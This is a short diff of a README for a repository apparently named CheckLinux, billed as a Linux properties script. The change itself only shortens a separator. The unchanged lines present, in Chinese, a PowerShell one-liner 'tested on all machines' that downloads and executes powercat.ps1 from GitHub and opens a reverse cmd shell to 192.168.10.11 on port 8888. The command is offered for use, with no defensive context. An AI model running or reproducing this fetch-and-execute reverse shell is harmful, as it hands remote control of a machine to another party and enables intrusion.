@@ -1,6 +1,6 @@
 # CheckLinux
 linux的基本属性脚本
-————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
+———————————————————————————————————————————————————————————————
 #cmd窗口下利用Powershell反弹NC shell 
 亲测所有机器都适用
 powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/zyh2580/CheckLinux/master/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd
